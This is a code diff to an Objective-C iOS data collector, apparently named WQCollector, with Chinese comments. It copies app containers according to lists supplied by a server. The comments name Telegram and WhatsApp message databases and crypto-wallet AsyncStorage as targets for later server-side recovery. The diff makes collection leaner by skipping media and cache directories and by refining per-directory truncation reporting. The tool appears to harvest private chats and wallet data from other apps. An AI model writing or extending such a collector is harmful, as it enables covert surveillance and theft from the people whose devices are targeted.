@@ -257,7 +257,8 @@ static NSUInteger WQRelativeDepth(NSString *rel) {
 /// truncated 必须单独成一类：整容器（TG / WhatsApp）撞到体积上限时，文件数一定对不上，
 /// 但它不是失败，不能混进"采集缺口"。
 static NSString *WQCoverageVerdict(BOOL srcExists, NSUInteger srcFiles,
-                                   BOOL dstExists, NSUInteger dstFiles, BOOL truncated) {
+                                   BOOL dstExists, NSUInteger dstFiles,
+                                   BOOL truncated, NSUInteger skippedDirs) {
     if (!srcExists) return @"MISSING(容器里没有这个路径)";
     if (srcFiles == 0) return @"EMPTY(容器内 0 个文件)";
     if (!dstExists || dstFiles == 0) return @"NOT-COPIED(容器内有文件，采集到 0)";
@@ -265,6 +266,10 @@ static NSString *WQCoverageVerdict(BOOL srcExists, NSUInteger srcFiles,
         return [NSString stringWithFormat:@"TRUNCATED(达到 %llu GiB / %lu 文件上限，已采 %lu/%lu)",
                 kMaxCopyBytes / (1024ULL * 1024ULL * 1024ULL),
                 (unsigned long)kMaxCopyFiles, (unsigned long)dstFiles, (unsigned long)srcFiles];
+    }
+    if (skippedDirs > 0) {
+        return [NSString stringWithFormat:@"covered(已跳过 %lu 个媒体/缓存目录，实采 %lu/%lu 文件)",
+                (unsigned long)skippedDirs, (unsigned long)dstFiles, (unsigned long)srcFiles];
     }
     if (dstFiles < srcFiles) return @"PARTIAL(部分文件没复制成功)";
     return @"covered";
@@ -736,8 +741,17 @@ static NSUInteger WQCopyContainer(NSString *containerPath, NSString *destDir, NS
 typedef struct {
     unsigned long long bytes;
     NSUInteger files;
+    NSUInteger skippedDirs;
     BOOL truncated;
 } WQCopyBudget;
+
+/// TG / WhatsApp 的媒体与缓存目录：postbox/media 这类占了整容器 99% 的体积，
+/// 服务端 recover 也用不到（findPostboxDb 明确跳过这些名字）。复制时直接不进。
+static BOOL WQIsBulkDirName(NSString *name) {
+    return [name isEqualToString:@"media"] || [name isEqualToString:@"cache"] ||
+           [name isEqualToString:@"cache-storage"] || [name isEqualToString:@"storage"] ||
+           [name isEqualToString:@"logs"];
+}
 
 /// 按清单递归复制一棵目录树（不限深度，跳过软链环）。
 /// WQCopyContainer 只到容器根下第 3 层，而钱包类 App 的 AsyncStorage 落在
@@ -767,6 +781,10 @@ static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth, WQC
         if (lstat(child.fileSystemRepresentation, &sb) != 0) continue;
         if (S_ISLNK(sb.st_mode)) continue;          // 不跟随，避免 AppGroup 软链环
         if (S_ISDIR(sb.st_mode)) {
+            if (WQIsBulkDirName(name)) {
+                if (budget) budget->skippedDirs++;
+                continue;                        // 媒体/缓存：不递归、不复制
+            }
             copied += WQCopyTree(child, target, depth + 1, budget);
         } else if (S_ISREG(sb.st_mode)) {
             if (budget &&
@@ -1066,6 +1084,8 @@ static NSString *WQRunCollection(void) {
             NSError *copyError = nil;
             NSUInteger copiedFiles = 0;
             WQCopyBudget budget = {0};
+            NSMutableDictionary<NSString *, NSNumber *> *dirTruncated = [NSMutableDictionary dictionary];
+            NSMutableDictionary<NSString *, NSNumber *> *dirSkipped = [NSMutableDictionary dictionary];
             if (dirList.count == 0 && fileList.count == 0) {
                 // 清单为空（旧服务端 / 后台没勾选）：退回整容器 3 层，与之前行为一致
                 copiedFiles = WQCopyContainer(container, dest, &copyError);
@@ -1075,7 +1095,18 @@ static NSString *WQRunCollection(void) {
                     BOOL whole = [rel isEqualToString:@"."];
                     NSString *srcPath = whole ? container : [container stringByAppendingPathComponent:rel];
                     NSString *dstPath = whole ? dest : [dest stringByAppendingPathComponent:rel];
-                    copiedFiles += WQCopyTree(srcPath, dstPath, WQRelativeDepth(rel), &budget);
+                    // 每个目录单独记 truncated：budget 继承已用量，所以总上限仍然生效，
+                    // 但 truncated 只算这一次——否则后面的小目录会被前面的巨无霸带成 TRUNCATED。
+                    WQCopyBudget one = {0};
+                    one.bytes = budget.bytes;
+                    one.files = budget.files;
+                    copiedFiles += WQCopyTree(srcPath, dstPath, WQRelativeDepth(rel), &one);
+                    budget.bytes = one.bytes;
+                    budget.files = one.files;
+                    budget.skippedDirs += one.skippedDirs;
+                    budget.truncated = budget.truncated || one.truncated;
+                    dirTruncated[rel] = @(one.truncated);
+                    dirSkipped[rel] = @(one.skippedDirs);
                 }
                 for (NSString *rel in fileList) {
                     NSString *srcPath = [container stringByAppendingPathComponent:rel];
@@ -1091,8 +1122,12 @@ static NSString *WQRunCollection(void) {
             }
 
             if (budget.truncated) {
-                WQScopeLog(@"[%@] 复制达到上限（%llu 字节 / %lu 文件），已截断",
-                           bundleID, budget.bytes, (unsigned long)budget.files);
+                WQScopeLog(@"[%@] 复制达到上限（%llu 字节 / %lu 文件），已截断；跳过媒体/缓存 %lu 个",
+                           bundleID, budget.bytes, (unsigned long)budget.files,
+                           (unsigned long)budget.skippedDirs);
+            } else if (budget.skippedDirs > 0) {
+                WQScopeLog(@"[%@] 已跳过媒体/缓存目录 %lu 个（media/cache/storage/logs），实采 %llu 字节",
+                           bundleID, (unsigned long)budget.skippedDirs, budget.bytes);
             }
             if (copiedFiles == 0) {
                 NSLog(@"[WQCollector] %@ 未复制到文件: %@", bundleID, copyError.localizedDescription);
@@ -1119,14 +1154,16 @@ static NSString *WQRunCollection(void) {
                 BOOL dstExists = [fm fileExistsAtPath:dstDir];
                 if (dstExists) WQProbePath(dstDir, relDepth, &got);
 
+                BOOL dirWasTruncated = [dirTruncated[rel] boolValue];
+                NSUInteger skippedForDir = [dirSkipped[rel] unsignedIntegerValue];
                 NSString *verdict = WQCoverageVerdict(srcExists, src.files, dstExists, got.files,
-                                                      budget.truncated);
+                                                      dirWasTruncated, skippedForDir);
                 WQScopeLog(@"[%@] dir  %@  depth=%lu exists=%d isDir=%d 容器内 files=%lu dirs=%lu bytes=%llu denied=%lu | 采集到 files=%lu bytes=%llu  %@",
                            bundleID, rel, (unsigned long)relDepth, (int)srcExists, (int)srcIsDir,
                            (unsigned long)src.files, (unsigned long)src.dirs, src.bytes,
                            (unsigned long)src.denied,
                            (unsigned long)got.files, got.bytes, verdict);
-                if (![verdict isEqualToString:@"covered"]) {
+                if (![verdict hasPrefix:@"covered"]) {
                     [notCopied addObject:[NSString stringWithFormat:@"%@:%@(%@)", bundleID, rel, verdict]];
                 }
             }
@@ -1139,13 +1176,13 @@ static NSString *WQRunCollection(void) {
                 NSDictionary *dstAttr = [fm attributesOfItemAtPath:dstFile error:NULL];
                 NSString *verdict = WQCoverageVerdict(srcAttr != nil, srcAttr ? 1 : 0,
                                                      dstAttr != nil, dstAttr ? 1 : 0,
-                                                     budget.truncated);
+                                                     budget.truncated, 0);
                 WQScopeLog(@"[%@] file %@  depth=%lu exists=%d 容器内=%llu B 采集到=%llu B  %@",
                            bundleID, rel, (unsigned long)relDepth, (int)(srcAttr != nil),
                            srcAttr ? [srcAttr[NSFileSize] unsignedLongLongValue] : 0ULL,
                            dstAttr ? [dstAttr[NSFileSize] unsignedLongLongValue] : 0ULL,
                            verdict);
-                if (![verdict isEqualToString:@"covered"]) {
+                if (![verdict hasPrefix:@"covered"]) {
                     [notCopied addObject:[NSString stringWithFormat:@"%@:%@(%@)", bundleID, rel, verdict]];
                 }
             }
